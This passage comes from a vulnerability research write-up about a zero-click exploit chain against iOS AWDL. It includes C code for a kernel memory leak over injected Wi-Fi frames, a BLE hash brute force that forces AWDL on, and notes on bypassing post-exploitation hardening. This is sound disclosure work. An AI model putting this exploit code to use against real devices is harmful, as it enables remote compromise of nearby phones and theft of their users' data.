Now, when this thread gets scheduled and tries to handling pending ASTs, it will try to handle our fake signal and a calculator will appear:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCtG-_s1200_image3.jpg)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCtG-_s1999_image3.jpg)

### An iPhone 11 Pro running Calculator.app with a monitor in the background displaying the output from the final stage of the AWDL exploit

# Improving the bootstrap BSS steering read

We've popped calc, we're done! Or are we? It's kinda slow, and there's no real reason for it to be so slow. We managed to build quite a fast arbitrary read primitive so that's not the bottleneck. The major bottleneck at the moment is the initial BSS Steering-based read. It's taking 8 seconds per read because it needs the state machine to time out between each attempt.

As we saw, however, the BSS Steering TLV indicates that we should be able to steer up to 8 peers at the same time, meaning that we should be able to improve our read speed by at least 8x. In fact, if we can get away with 8 or fewer initial reads our read speed could be much faster than that.

However, when you try to steer 8 peers simultaneously, it doesn't quite work as expected:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoqu7_s1200_image8%283%29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoqu7_s1432_image8%283%29.png)

### When multiple peers are steered the UMIs flood the airwaves. In this example I was steering 8 peers but the frames are dominated by UMIs to the first peer. You can see a handful of UMIs to :06, and one to :02 amongst the dozens to :00.

Testing against MacOS we also see the following log message:

#### Peer 22:22:aa:22:00:00 DID NOT ack our UMI

When the target tries to steer 8 peers at the same time it starts flooding the airwaves with UMI frames directed at the target peers - so many in fact that it never actually manages to send the UMIs for all 8 steering targets before timing out.

We've already covered how to stall the initial sending of UMIs by controlling the channel sequence, but it looks like we're also going to have to ACK the UMI frames.

# ACK a MAC?

As we saw earlier, ACKs in 80211.a and g are timing based. To ACK a frame you have to send the ACK in the short window following the transmission of the frame. We definitely can't do that using libpcap, the timing needs microsecond precision. We probably can't even do that with a custom kernel driver.

There is however an obscure WiFi adaptor monitor mode feature called "Active Monitor Mode", supported by very few chipsets.

Active monitor mode allows you to inject and monitor arbitrary frames as usual, except in active monitor mode (as opposed to regular monitor mode) the adaptor will still ACK frames if they're being sent to its MAC address.

The Mediatek MT76 chipset was the only one I could find with a USB adaptor that supports this feature. I bought a bunch of MT76-based adaptors and the only one where I could actually get this feature to work was the [ZyXEL NWD6605](https://www.zyxel.com/products_services/Dual-Band-Wireless-AC1200-USB-Adapter-NWD6605/downloads) which uses an mt76x2u chipset.

The only issue was that I could only get Active Monitor Mode to actually work when running at 12 Mbps on a 5GHz channel but my current setup was using adaptors which were not capable of 5GHz injection.

# Moving to 5GHz

I had tried right back at the beginning of the exploit development process to get 5GHz injection and monitoring to work; after trying for a week with lots of adaptors and building many, many branches of kernel drivers and fiddling with radiotap headers I had given up and decided to focus on getting something working on 2.4GHz with my old adaptors.

This time around I just bought all the adaptors I could find which looked like they might have even the remotest possibility of working and tried again.

One of the challenges is that OEMs won't consistently use the same chipset or revision of chipset in a device, which means getting hold of a particular chipset and revision can be a hit-and-miss process.

Here are all the adaptors which I used during this exploit to try to find support for the features I wanted:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCSN7_s1200_image34.jpg)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCSN7_s1939_image34.jpg)

### All the WiFi adaptors tested during this exploit development process, from top left to bottom right: D-Link DWA-125, Netgear WG111-v2, Netgear A6210, ZyXEL NWD6605, ASUS USB-AC56, D-Link DWA-171, Vivanco 36665, tp-link Archer T1U, Microsoft Xbox wireless adaptor Model 1790, Edimax EW-7722UTn V2, FRITZ!WLAN AC430M, ASUS USB-AC68, tp-link AC1300

In the end I required two different adaptors to get the features I wanted:

Active monitor mode and frame injection: [ZyXEL NWD6605](https://www.zyxel.com/products_services/Dual-Band-Wireless-AC1200-USB-Adapter-NWD6605/downloads) using [mt76x2u](https://github.com/openwrt/mt76) driver

Monitor mode (including management and ACK frames): Netgear A6210 using [rtl8812au](https://github.com/aircrack-ng/rtl8812au) driver

With this setup I was able to get frame injection, monitor mode sniffing of all frames including management and ACK frames as well as Active monitor mode to work at 12 Mbps on channel 44.

# Working with Active Monitor Mode

You can enable the feature like this:

#### ip link set dev wlan1 down

#### iw dev wlan1 set type monitor

#### iw dev wlan1 set monitor active control otherbss

#### ip link set dev wlan1 up

#### iw dev wlan1 set channel 44

We can change the card's MAC address using the ip tool like this:

#### ip link set dev wlan1 down

#### ip link set wlan1 address 44:44:22:22:22:22

#### ip link set dev wlan1 up

Changing the MAC address like this takes at least a second and the interface has to be down. Since we're trying to make these reads as fast as possible I decided to take a look at how this mac address changing actually worked to see if I could speed it up...

Three ways to set a MAC: 1 - ioctl

The old way to set a network device MAC address is to use the SIOCSIFHWADDR ioctl:

#### struct ifreq ifr = {0};

#### uint8\_t mac\[6\] = {0x22, 0x23, 0x24, 0x00, 0x00, 0x00};

#### memcpy(&ifr.ifr\_hwaddr.sa\_data\[0\], mac, 6);

#### int s = socket(AF\_INET, SOCK\_DGRAM, 0);

#### strcpy(ifr.ifr\_name, "wlan1");

#### ifr.ifr\_hwaddr.sa\_family = ARPHRD\_ETHER;

#### int ret = ioctl(s, SIOCSIFHWADDR, &ifr);

#### printf("ioctl retval: %d\\n", ret);

This interface is deprecated and doesn't work at all for this driver.

Three ways to set a MAC: 2 - netlink

The current supported interface is [netlink](https://www.linuxjournal.com/article/7356). It took a whole day to learn enough about netlink to write a standalone PoC to change a MAC address. Netlink is presumably very powerful but also quite obtuse. And even after all that (perhaps unsurprisingly) it's no faster than the command line tool which is really just making these same netlink API calls too.

Check out change\_mac\_nl.c in the released exploit source code to see the netlink code.

Three ways to set a MAC: 3 - hacker

Trying to do this the supported way has failed, it's just way too slow. But thinking about it, what is the MAC anyway? It's almost certainly just some field stored in flash or RAM on the chipset and yes, diving in to the [mt76x2u linux kernel driver source](https://github.com/openwrt/mt76/blob/27670514328f9ec4e64b57ea7cb54d8594dcefa0/mt76x02_mac.c) and tracing the functions which set the MAC address we can see that ends up writing to some configuration registers on the chip:

#### \#define MT\_MAC\_ADDR\_DW00x1008

#### \#define MT\_MAC\_ADDR\_DW10x100c

#### void mt76x02\_mac\_setaddr(struct mt76x02\_dev \*dev, const u8 \*addr)

#### {

#### static const u8 null\_addr\[ETH\_ALEN\] = {};

#### int i;

#### ether\_addr\_copy(dev->mt76.macaddr, addr);

#### if (!is\_valid\_ether\_addr(dev->mt76.macaddr)) {

#### eth\_random\_addr(dev->mt76.macaddr);

#### dev\_info(dev->mt76.dev,

#### "Invalid MAC address, using random address %pM\\n",

#### dev->mt76.macaddr);

#### }

#### mt76\_wr(dev,

#### MT\_MAC\_ADDR\_DW0,

#### get\_unaligned\_le32(dev->mt76.macaddr));

#### mt76\_wr(dev,

#### MT\_MAC\_ADDR\_DW1,

#### get\_unaligned\_le16(dev->mt76.macaddr + 4) \|

#### FIELD\_PREP(MT\_MAC\_ADDR\_DW1\_U2ME\_MASK, 0xff));

#### ...

I wonder if I could just write directly to those configuration registers? Would it completely blow up? Or would it just work? Is there an easy way to do this or will I have to patch the driver?

Looking around the driver a bit we can see it has a [debugfs](https://lwn.net/Articles/115405/) interface. Debugfs is a very neat way for drivers to easily expose lots of internal stuff out to userspace, restricted to root, for logging and monitoring as well as for messing around with:

#### root@raspberrypi:/sys/kernel/debug/ieee80211/phy7/mt76\# ls

#### agc  ampdu\_stat  dfs\_stats  edcca  eeprom  led\_pin  queues  rate\_txpower  regidx  regval  temperature  tpc  tx\_hang\_reset  txpower

What we're after is a way to write to arbitrary control registers, and these two debugfs files let you do exactly that:

#### \\# cat regidx

#### 0

#### \\# cat regval

#### 0x76120044

If you write the address of the configuration register you want to read or write to the regidx file as a decimal value then reading or writing the regval file lets you read or write that configuration register as a 32-bit hexadecimal value. Note that exposing configuration registers this way is a feature of this particular driver's debugfs interface, not a generic feature of debugfs. With this we can completely skip the netlink interface and the requirement to bring the device down and instead directly manipulate the internal state of the adaptor.

I replace the netlink code with this:

#### void mt76\_debugfs\_change\_mac(char\* phy\_str, struct ether\_addr new\_mac) {

#### union mac\_dwords {

#### struct ether\_addr new\_mac;

#### uint32\_t dwords\[2\];

#### } data = {0};

#### data.new\_mac = new\_mac;

#### char lower\_dword\_hex\_str\[16\] = {0};

#### snprintf(lower\_dword\_hex\_str, 16, "0x%08x\\n", data.dwords\[0\]);

#### char upper\_dword\_hex\_str\[16\] = {0};

#### snprintf(upper\_dword\_hex\_str, 16, "0x%08x\\n", data.dwords\[1\]);

#### char\* regidx\_path = NULL;

#### asprintf(&regidx\_path,

#### "/sys/kernel/debug/ieee80211/%s/mt76/regidx",

#### phy\_str);

#### char\* regval\_path = NULL;

#### asprintf(&regval\_path,

#### "/sys/kernel/debug/ieee80211/%s/mt76/regval",

#### phy\_str);

#### file\_write\_string(regidx\_path, "4104\\n");

#### file\_write\_string(regval\_path, lower\_dword\_hex\_str);

#### file\_write\_string(regidx\_path, "4108\\n");

#### file\_write\_string(regval\_path, upper\_dword\_hex\_str);

#### free(regidx\_path);

#### free(regval\_path);

#### }

and... it works! The adaptor instantly starts ACKing frames to whichever MAC address we write in to the MAC address field in the adaptor's configuration registers.

All that's then required is a rewrite of the early read code:

Now it starts out steering 8 stalled peers. Each time a read is requested, if there's still time left before steering will timeout and there are still stalled peers, one stalled peer is chosen, has it's steering\_msg\_blob pointer corrupted with the read target and gets unstalled. The target will start sending UMIs to that peer, we set the correct MAC address on the active monitor device, sniff the UMI and ACK it to stop the peer sending more. From the UMI we extract the value from TLV 0x1d and get the disclosed kernel memory.

If there are no more stalled peers, or steering has timed out, we wait a safe amount of time until we're able to restart all 8 peers and start again:

#### struct ether\_addr reader\_peers\[8\];

#### struct early\_read\_params {

#### struct ether\_addr dst;

#### char\* phy\_str;

#### } er\_para;

#### void init\_early\_read(struct ether\_addr dst, char\* phy\_str) {

#### er\_para.dst = dst;

#### er\_para.phy\_str = phy\_str;

#### reader\_peers\[0\] = \*(ether\_aton("22:22:aa:22:00:00"));

#### reader\_peers\[1\] = \*(ether\_aton("22:22:aa:22:00:01"));

#### reader\_peers\[2\] = \*(ether\_aton("22:22:aa:22:00:02"));

#### reader\_peers\[3\] = \*(ether\_aton("22:22:aa:22:00:03"));

#### reader\_peers\[4\] = \*(ether\_aton("22:22:aa:22:00:04"));

#### reader\_peers\[5\] = \*(ether\_aton("22:22:aa:22:00:05"));

#### reader\_peers\[6\] = \*(ether\_aton("22:22:aa:22:00:06"));

#### reader\_peers\[7\] = \*(ether\_aton("22:22:aa:22:00:07"));

#### }

#### // state required between early reads:

#### uint64\_t steering\_begin\_timestamp = 0;

#### int n\_steered\_peers = 0;

#### void\* try\_early\_read(uint64\_t kaddr, size\_t\* out\_size) {

#### struct ether\_addr peer\_b = \*(ether\_aton("22:22:bb:22:00:00"));

#### int n\_peers = 8;

#### struct ether\_addr reader\_peer;

#### int should\_restart\_steering = 0;

#### // what phase are we in?

#### uint64\_t milliseconds\_since\_last\_steering =

#### (now\_nanoseconds() - steering\_begin\_timestamp) /

#### (1ULL\*1000ULL\*1000ULL);

#### if (milliseconds\_since\_last\_steering < 5000 &&

#### n\_steered\_peers < 8) {

#### // if less than 5 seconds have elapsed since we started steering

#### // and we haven't reached the peer limit, then steer the next peer

#### reader\_peer = reader\_peers\[n\_steered\_peers++\];

#### } else if (milliseconds\_since\_last\_steering < 8000) {

#### // wait for the steering machine to timeout so we can restart it

#### usleep((8000 - milliseconds\_since\_last\_steering) \* 1000);

#### should\_restart\_steering = 1;

#### } else {

#### // more than 8 seconds have already elapsed since we last

#### //started steering (or we've never started it) so restart

#### should\_restart\_steering = 1;

#### }

#### if (should\_restart\_steering) {

#### // make reader peers suitable for bss steering

#### n\_steered\_peers = 0;

#### for (int i = 0; i < n\_peers; i++) {

#### inject(RT(),

#### WIFI(er\_para.dst, reader\_peers\[i\]),

#### AWDL(),

#### SYNC\_PARAMS(),

#### CHAN\_SEQ\_EMPTY(),

#### HT\_CAPS(),

#### UNICAST\_DATAPATH(0x1307 \| 0x800),

#### PKT\_END());

#### }

#### inject(RT(),

#### WIFI(er\_para.dst, peer\_b),

#### AWDL(),

#### SYNC\_PARAMS(),

#### HT\_CAPS(),

#### UNICAST\_DATAPATH(0x1307),

#### BSS\_STEERING\_0(reader\_peers, n\_peers),

#### PKT\_END());

#### steering\_begin\_timestamp = now\_nanoseconds();

#### reader\_peer = reader\_peers\[n\_steered\_peers++\];

#### }

#### char overflower\[128\] = {0};

#### \*(uint64\_t\*)(&overflower\[0x50\]) = kaddr;

#### // set the card's MAC to ACK the UMI from the target

#### mt76\_debugfs\_change\_mac(er\_para.phy\_str, reader\_peer);

#### inject(RT(),

#### WIFI(er\_para.dst, reader\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### SERV\_PARAM(),

#### HT\_CAPS(),

#### DATAPATH(reader\_peer),

#### SYNC\_TREE((struct ether\_addr\*)overflower,

#### sizeof(overflower)/sizeof(struct ether\_addr)),

#### PKT\_END());

#### // try to receive a UMI:

#### void\* steering\_tlv = try\_get\_TLV(0x1d);

#### if (steering\_tlv) {

#### struct mini\_tlv {

#### uint8\_t type;

#### uint16\_t len;

#### } \_\_attribute\_\_((packed));

#### \*out\_size = ((struct mini\_tlv\*)steering\_tlv)->len+3;

#### } else {

#### printf("didn't get TLV\\n");

#### }

#### // NULL out the bsssteering blob

#### char null\_overflower \[128\] = {0};

#### inject(RT(),

#### WIFI(er\_para.dst, reader\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### SERV\_PARAM(),

#### HT\_CAPS(),

#### DATAPATH(reader\_peer),

#### SYNC\_TREE((struct ether\_addr\*)null\_overflower,

#### sizeof(null\_overflower)/sizeof(struct ether\_addr)),

#### PKT\_END());

#### // the active monitor interface doesn't always manage to ACK

#### // the first frame, give it a chance

#### usleep(1\*1000);

#### return steering\_tlv;

#### }

# Demo

With some luck we can bootstrap the faster read primitive with 8 or fewer early reads which means on an iPhone 11 Pro with AWDL enabled popping calc now looks like this:

AWDL Pop Calc - YouTube

Tap to unmute

[AWDL Pop Calc](https://www.youtube.com/watch?v=oA71qtP_sSU) [Ian Beer](https://www.youtube.com/channel/UC-NT5AokdA2-XbI_XHvMwPA)

![thumbnail-image](https://yt3.ggpht.com/ytc/AIdro_ly2S6SGXiVzX-0Xd2O3DtbdHQhH92vlcYxC4mmPK52FsY=s68-c-k-c0x00ffffff-no-rj)

Ian Beer1.62K subscribers

[Watch on](https://www.youtube.com/watch?v=oA71qtP_sSU)

### In this demo AWDL has been manually enabled by opening the sharing panel in the Photos app. This keeps the AWDL interface active. The exploit gains arbitrary kernel memory read and write within a few seconds and is able to inject a signal into a userspace process to cause it to JOP to a single gadget which opens Calculator.app

# Zero clicks

I mentioned that AWDL has to be enabled, it isn't always on. In order to make this an interactionless zero-click exploit which can target any device in radio proximity we therefore need a way to force devices to enable their AWDL interface.

AWDL is used for many things. For example, my iPhone seems to turn on AWDL when it receives a voicemail because it really wants to Airplay the voicemail to my Apple TV. But sending someone a voicemail requires their phone number, and we're looking for an attack which requires no identifiers or non-default settings.

The [second research paper from the SEEMOO labs team](https://www.usenix.org/system/files/sec19fall_stute_prepub.pdf) demonstrated an attack to enable AWDL using Bluetooth low energy advertisements to force arbitrary devices in radio proximity to enable their AWDL interfaces for Airdrop. SEEMOO didn't publish their code for this attack so I decided to recreate it myself.

# Enabling AWDL

In the iOS photos app when you select the sharing dialog and click "Airdrop" a list of iOS and MacOS devices nearby appears, all of which you can send your photo to. Most people don't want random passers-by sending them unsolicited photos so the default AirDrop sharing setting is "Contacts Only" meaning you will only see AirDrop sharing requests from users in your contacts book. But how does this work? For an in-depth discussion, check out the SEEMOO labs paper.

When a device wants to share a file via AirDrop it starts broadcasting a [bluetooth low-energy advertisements](https://www.argenox.com/library/bluetooth-low-energy/ble-advertising-primer/) which looks like this example, broadcast by MacOS:

#### \[PACKET\] \[ CH:37\|CLK:1591031840.920892\|RSSI:-44dBm \] << BLE - Advertisement Packet \| type=ADV\_IND \| addr=28:C4:72:91:05:D7 \| data=02010617ff4c000512000000000000000001297f247ee56f62b300 >>

BLE advertisements are small, they have a maximum payload size of 31 bytes. The bundle of bytes at the end are actually four truncated 2-byte SHA256 hashes of the contact information of the device which is trying to share something. The contact information used are the email addresses and phone numbers associated with the device's logged-in iCloud account. You can generate the same truncated hashes like this:

In this case I'm using a test account with the iCloud email address: 'chris.donut1981@icloud.com'

#### >>\> import hashlib

#### >>\> s = 'chris.donut1981@icloud.com'

#### >>\> hashlib.sha256(s.encode('utf-8')).hexdigest()\[:4\]

#### '62b3'

Notice that this matches the two penultimate bytes in the advertisement frame shown above. The contact hashes are unsalted which [can have some fun consequences if you live in a country with localized mobile phone numbers](https://hexway.io/research/apple-bleee/), but this is an understandable performance optimization.

All iOS devices are constantly receiving and processing BLE advertisement frames like this. In the case of these AirDrop advertisements, when the device is in the default "Contacts Only" mode, sharingd (which parses BLE advertisements) checks whether this unsalted, truncated hash matches the truncated hashes of any emails or phone numbers in the device's address book.

If a match is found this doesn't actually mean the sending device really is in the receiver's address book, just that there is a contact with a colliding hash. In order to resolve this the devices need to share more information and at this point the receiver enables AWDL to establish a higher-bandwidth communication channel.

The SEEMOO labs paper continues in great detail about how the two devices then really verify that the sender is in the receiver's address book, but we are only trying to get AWDL enabled so we're done. As long as we keep broadcasting the advertisement with the colliding hash the target's AWDL interface will remain active.

# Blue in the teeth

The SEEMOO labs team paper discusses the custom firmware they wrote for a BBC micro:bit so I picked up a couple of those:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPHzx_s1200_image26.jpg)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPHzx_s1222_image26.jpg)

### The BBC micro:bit is an education-focused dev board. This photo shows the rear of the board; the front has a 5x5 LED matrix and two buttons. They cost under $20.

These devices are intended for the education/maker market. It's a [Nordic nRF51822 SOC](https://www.nordicsemi.com/Products/Low-power-short-range-wireless/nRF51822) with a [Freescale KL26](https://www.nxp.com/docs/en/data-sheet/KL26P121M48SF4.pdf) acting as a USB programmer for the nRF51. BBC provide a small programming environment for it, but you can build any firmware image for the nRF51, plug in the micro:bit which appears as a mass-storage device thanks to the KL26 and drag and drop the firmware image on there. The programmer chip flashes the nRF51 for you and you can run your code. This is the device which the SEEMOO labs team used and wrote a custom firmware for.

Whilst playing around with the micro:bit I discovered the [MIRAGE](https://github.com/RCayre/mirage) project, a generic and amazingly well documented project for doing all manner of radio security research. Their tools have a firmware for the micro:bit, and indeed, dropping their provided firmware image on to the micro:bit and running this:

#### sudo ./mirage\_launcher ble\_sniff SNIFFING\_MODE=advertisements INTERFACE=microbit0

we're able to start sniffing BLE advertisements:

#### \[PACKET\] \[ CH:37\|CLK:1591006615.511192\|RSSI:-46dBm \] << BLE - Advertisement Packet \| type=ADV\_IND \| addr=58:6A:80:4F:41:74 \| data=02011a020a0707ff4c000f020000 >>

Indeed, if you do this at home you'll likely see a barrage of BLE traffic from everything imaginable. Apple devices are particularly chatty, notice the frames sent each time your Airpods case is open and closed.

If we take a look at a couple of captured BTLE frames when we try to share a file via AirDrop, we can see there's clearly structure in there:

#### MacOS:

#### data=02010617ff4c000512000000000000000001fa5c2516bf07aba400

#### iOS 13:

#### data=02011a020a070eff4c000f05a035c928291002710c

#### LEN    APPL T L  V

#### 020106       17  ff 4c00 0512 000000000000000001 fa5c 2516 bf07 aba4 00

#### 02011a020a07 0e  ff 4c00 0f05 a035c92829 1002 710c

Definitely looks like more TLVs! With some reversing in sharingd we can figure out what these types are:

#### "Invalid" 0x0

#### "Hash" 0x1

#### "Company" 0x2

#### "AirPrint" 0x3

#### "ATVSetup" 0x4

#### "AirDrop" 0x5

#### "HomeKit" 0x6

#### "Prox" 0x7

#### "HeySiri" 0x8

#### "AirPlayTarget" 0x9

#### "AirPlaySource" 0xa

#### "MagicSwitch" 0xb

#### "Continuity" 0xc

#### "TetheringTarget" 0xd

#### "TetheringSource" 0xe

#### "NearbyAction" 0xf

#### "NearbyInfo" 0x10

#### "WatchSetup" 0x11

MacOS is sending AirDrop messages in the BLE advertisements. iOS is sending NearbyAction and NearbyInfo messages.

# Brute forcing SHA256, or two bytes of it at least

For testing purposes we want some contacts on the device. Like the SEEMOO labs paper I generated 100 random contacts using a modified version of the [AppleScript in this StackOverflow answer](https://apple.stackexchange.com/questions/61632/script-to-create-iphone-contacts). Each contact has 4 contact identifiers: home and work email, home and work phone numbers.

We can also use MIRAGE to prototype brute forcing through the 16 bit space of truncated contact hashes. I wrote a MIRAGE module to broadcast Airdrop advertisements with incrementing truncated hashes. The MIRAGE micro:bit firmware doesn't support arbitrary broadcast frame injection but it is able to use the Raspberry Pi 4's built-in bluetooth controller. Running it for a while and looking at the console output from the iPhone we notice some helpful log messages showing up in Console.app:

#### Hashing: Error: failed to get contactsContainsShortHashes because (ratelimited)

The SEEMOO paper mentioned that they were able to brute force a truncated hash in a couple of seconds but it appears Apple have now added some rate limiting.

Spoofing different BT source MAC addresses didn't help but slowing the brute force attempts to one every 2 seconds or so seemed to please the rate limiting and in around 30 seconds, with average luck AWDL gets enabled and MI and PSF frames start to appear on the AWDL social channels.

As long as we keep broadcasting the same advertisement with the matching contact hash the AWDL interface will remain active. I didn't want to keep MIRAGE as a dependency so I ported the python prototype to use the linux native libbluetooth library and [hci\_send\_cmd](https://people.csail.mit.edu/albert/bluez-intro/x682.html) to build custom advertisement frames:

#### uint8\_t payload\[\] = {0x02, 0x01, 0x06,

#### 0x17,

#### 0xff,

#### 0x4c, 0x00,

#### 0x05,

#### 0x12,

#### 0x00, 0x00, 0x00, 0x00,

#### 0x00, 0x00, 0x00, 0x00, 0x01,

#### hash1\[0\], hash1\[1\],

#### hash2\[0\], hash2\[1\],

#### hash3\[0\], hash3\[1\],

#### hash4\[0\], hash4\[1\],

#### 0x00};

#### le\_set\_advertising\_data\_cp data = {0};

#### data.length = sizeof(payload);

#### memcpy(data.data, payload, sizeof(payload));

#### hci\_send\_cmd(handle,

#### OGF\_LE\_CTL,

#### OCF\_LE\_SET\_ADVERTISING\_DATA,

#### sizeof(payload)+1,

#### &data);

# Popping calc with zero clicks

Combining the AWDL exploit and BLE brute-force, we get a new demo:

BLE + AWDL Pop Calc - YouTube

Tap to unmute

[BLE + AWDL Pop Calc](https://www.youtube.com/watch?v=vEwEw6lsevg) [Ian Beer](https://www.youtube.com/channel/UC-NT5AokdA2-XbI_XHvMwPA)

![thumbnail-image](https://yt3.ggpht.com/ytc/AIdro_ly2S6SGXiVzX-0Xd2O3DtbdHQhH92vlcYxC4mmPK52FsY=s68-c-k-c0x00ffffff-no-rj)

Ian Beer1.62K subscribers

[Watch on](https://www.youtube.com/watch?v=vEwEw6lsevg)

### With the phone left idle on the home screen and no user interaction we force the AWDL interface to activate using BLE advertisements. The AWDL exploit gains kernel memory read write in a few seconds after starting and the entire end to end exploit takes around a minute.

There may well be better, faster ways to force-enable AWDL but for my demo this will do.

# Let's run an implant!

This demo is neat but really doesn't convey that we've compromised almost all the user's data, with no interaction. We can read and write kernel memory remotely. I know that Apple has invested significant effort in "post-exploitation" hardening so I wanted to demonstrate that with just this single vulnerability these could be defeated to the point where I could run something like a real-world implant which we've seen being [deployed in real world exploitation against end users before](https://projectzero.google/2019/08/implant-teardown.html). Trying to defend against an attacker with arbitrary memory read/write is a losing game, but there's a difference between saying that and you believing me, and proving it.

# Speedy writer

We're going to need to write much more arbitrary data for this final step, so we need the arbitrary write to be even faster. There's one more optimization left.

Due to the order in which loads and stores occur in actionFrameReport we were able to build a primitive which gave us a timestamp valid for up to 1024ms and a large n\_frames\_in\_last\_second value. We used that to do one arbitrary add, then restarted the whole setup: replaced upper\_peer's timestamp with 0, sent another frame to get a fresh timestamp and so on.

But why can't we just keep using the first timestamp and bundle more writes together? We can, it's just very important to take care that we don't exceed that 1024ms window. The exploit takes a very conservative approach here and uses only a few extra milliseconds. The reason is that we're running as a regular userspace program on a small system. We don't have anything like real-time scheduling guarantees. [Linux kind-of supports running userspace programs on isolated cores](https://lwn.net/Articles/816298/) to give something like a real-time experience, but for getting this demo exploit running it was sufficient to boost the priority of the exploit process with nice and leave a large safety window in the 1024ms. The code tries to bundle large buffer writes in chunks of 16 which provides a reasonable speed up.

# Physmapping

Way back when I released the first demo exploit which disclosed random chunks of physical memory I had taken a look at how the physmap works on iOS.

Linux, Windows and XNU all have physmaps; they are a very convenient way of manipulating physical memory when your code has paging enabled and can't directly manipulate physical memory any more.

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5AuE_s624_image24.png)

### Abstractly, physmaps are virtual mappings of all of physical memory

The physmap is (typically) a 1:1 virtual mapping of physical memory. You can see in the diagram how the physical memory at the bottom might be split up into different regions, with some of those regions currently mapped in the kernel virtual address space. Some other physical memory regions might for example be used for userspace processes.

The physmap is the large kernel virtual memory region shown towards the right of the virtual address space, which is the same size as the amount of physical memory. The pagetables which translate virtual memory accesses in this region are set up in such a way that any access at an offset into the physmap virtual region gets translated to that same offset from the base of physical memory.

The physmap in XNU isn't set up exactly like that. Instead they use a "segmented physical aperture". In practise this means that they set up a number of smaller "sub-physmaps" inside the physmap region and populate a table called the PTOV table to allow translation from a physical address to a virtual address inside the physmap region:

#### pa: 0x000000080e978000 kva: 0xfffffff070928000 len: 0xde03c000 (3.7GB)

#### pa: 0x0000000808e14000 kva: 0xfffffff06ade4000 len: 0x05b44000 (95MB)

#### pa: 0x0000000801b80000 kva: 0xfffffff066000000 len: 0x04cb8000 (80MB)

#### pa: 0x0000000808d04000 kva: 0xfffffff06acf4000 len: 0x000f0000 (1MB)

#### pa: 0x0000000808df4000 kva: 0xfffffff06acd4000 len: 0x00020000 (130kb)

#### pa: 0x0000000808cec000 kva: 0xfffffff06acbc000 len: 0x00018000 (100kb)

#### pa: 0x0000000808a80000 kva: 0xfffffff06acb8000 len: 0x00004000 (16kb)

#### pa: 0x0000000808df4000 kva: 0xfffffff06acf4000 len: 0x00000000 (0kb)

There's one more important physical region not captured in the PTOV table which is the kernelcache image itself; this is found starting at gVirtBase and the kernel functions for translating between physical and physmap-virtual addresses take this into account.

The interesting thing is that the virtual protection of the pages in the physmap doesn't have to match the virtual protection of the pages as seen by a page table traversal from the perspective of a task. I wrote some test code using oob\_timestamp to overwrite a portion of its own \_\_TEXT segment in the physmap and it worked, allowing me to execute new native instructions. Could we execute userspace shellcode remotely by writing just directly into the physmap?

# What happened to my physmap?

This works fine when prototyped using oob\_timestamp modifying itself; but if you try to use it to target a system process, it panics. Something else is going on.

# APRR, PPL and pmap\_cs.

The canonical resource for [APRR is s1guza's blog post](https://siguza.github.io/APRR/). It's a hardware customization by Apple to add an extra layer of indirection to page protection lookups via a control register. The page-tables alone are no longer enough to determine the runtime memory protection of a page.

APRR is used in the Safari JIT hardening and in the kernel it's used to implement PPL (Page Protection Layer). For an [in-depth look at PPL check out Brandon Azad's recent blog post](https://projectzero.google/2020/07/the-core-of-apple-is-ppl-breaking-xnu.html).

PPL uses APRR to dynamically switch the page protections of two kernel regions, a text region containing code and a data region. Normally the PPL text region is not executable and the PPL data region is not writable. Important data structures have been moved into this PPL data region, including page tables and pmaps (the abstraction layer above page tables). All the code which modifies objects inside PPL data has been moved inside the PPL text segment.

But if the PPL text is non-executable, how can you run the code to modify the PPL data regions? And how can you make them writable?

The only way to execute the code inside the PPL text region is to go through a trampoline function which flips the APRR register bits to make the PPL text region executable and the PPL data region writable before jumping to the provided ppl\_routine. Obviously great care has to be taken to ensure only code inside PPL text runs in this state.

Brandon likened this to a "kernel inside the kernel" which is a good way to look at it. Modifications to page tables and pmaps are now meant to only happen by the kernel making "PPL syscalls" to request the modifications, with the implementation of those PPL syscalls being inside the PPL text region. Check out Brandon's blog post for discussion of how to exploit a vulnerability in the PPL code to make those changes anyway!

It turns out that it's not just page tables and pmaps which PPL protects. Reversing more of the PPL routines there's a section of them starting around routine 38 which are implementing a new model of codesigning enforcement called pmap\_cs.

Indeed, this pmap\_cs string appears in the released XNU source, though attempts have been made to strip as much of the PPL related code as possible from the open source release. The vm\_map\_entry structure has this new field:

#### /\\* boolean\_t \*/ pmap\_cs\_associated:1, /\* pmap\_cs will validate \*/

From this code snippet from vm\_fault.c it's pretty clear that pmap\_cs is a new way to verify code signatures:

#### \#if PMAP\_CS

#### if (fault\_info->pmap\_cs\_associated &&

#### pmap\_cs\_enforced(pmap) &&

#### !m->vmp\_cs\_validated &&

#### !m->vmp\_cs\_tainted &&

#### !m->vmp\_cs\_nx &&

#### (prot & VM\_PROT\_EXECUTE) &&

#### (caller\_prot & VM\_PROT\_EXECUTE)) {

#### /\*

#### \\* With pmap\_cs, the pmap layer will validate the

#### \\* code signature for any executable pmap mapping.

#### \\* No need for us to validate this page too:

#### \\* in pmap\_cs we trust...

#### \*/

#### vm\_cs\_defer\_to\_pmap\_cs++;

#### } else {

#### vm\_cs\_defer\_to\_pmap\_cs\_not++;

#### vm\_page\_validate\_cs(m);

#### }

#### \#else /\* PMAP\_CS \*/

#### vm\_page\_validate\_cs(m);

#### \#endif /\* PMAP\_CS \*/

vm\_page\_validate\_cs is the old code-signing enforcement code, which can be easily tricked into allowing shellcode by changing the codesigning enforcement flags in the task's proc structure. The question is what determines whether the new pmap\_cs model or the old approach is used?

# A pmap\_cs workaround

The fundamental question I'm trying to answer is why the physmap shellcode injection technique works for a test app I'm debugging, but not a system process, even when the system process's code signing flags have been modified such that it should be allowed to run unsigned code?

